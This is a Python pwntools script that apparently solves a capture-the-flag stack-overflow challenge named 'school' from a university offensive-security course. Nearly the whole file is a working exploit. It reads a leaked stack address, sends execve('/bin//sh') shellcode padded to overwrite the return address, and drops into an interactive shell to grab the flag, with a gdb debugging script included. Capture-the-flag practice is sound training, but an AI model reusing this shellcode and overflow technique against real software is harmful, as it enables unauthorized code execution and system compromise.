#import from py
import re

#outside imports
from pwn import *

#used for pulling the flag from output
flag_regex = r"flag\{[^}]+\}"
global_timeout = 5 #seconds

#challenge-specific info
host = 'offsec-chalbroker.osiris.cyber.nyu.edu'
port = 1338
netid='adp369'

do_remote = False
binary_name = './school'

#for doing local debugging
is_local_dbg = True
gdb_script = '''
set pagination off
set disassembly-flavor intel
i proc mappings
b *0x00400681
c
'''

#universal flag finder, given a string
def find_flag(input):
    m = re.findall(flag_regex, input)
    if(m != []):
        return m[0]
    else:
        return None


def gen_buffer(school_addr):
    #rsp = 0x7ffc898d19a8 ; school = 0x7FFC898D1980
    # diff: 0x28
    print 'School Offset: 0x%X' % school_addr
    shellcode   = "6A6848B82F62696E2F2F2F73504889E731F66A3B58990F05".decode('hex')
    payload = ''
    payload+= shellcode.ljust(32, '\xcc')
    payload+= 'B'*8     #leave (pop rbp)
    payload+= p64(school_addr+0x28-len(payload))
    return payload


def solve(target):
    school_addr = target.readline().replace("Let's go to school! School's at: 0x","")
    school_addr = int(school_addr.replace(". gimme directions:",""), 16)
    print target.sendline(gen_buffer(school_addr))
    print target.readline()
    target.interactive()
    return target.readline()


#universal target setup for remote-only
def target():
    if(do_remote):
        r = remote(host, port)
        r.sendline(netid)
        r.recvline() # eat interstitial
        return r
    else:
        if(is_local_dbg):
            target = gdb.debug(binary_name, gdb_script)
        else:
            target = process(binary_name)
        return target

#scaffolding
def main():
    with target() as p:
        flag = find_flag(solve(p))
    if(flag):
        print "Challenge Solved: %s" % flag
    else:
        print "Challenge Not Solved"

if __name__ == '__main__':
    main()
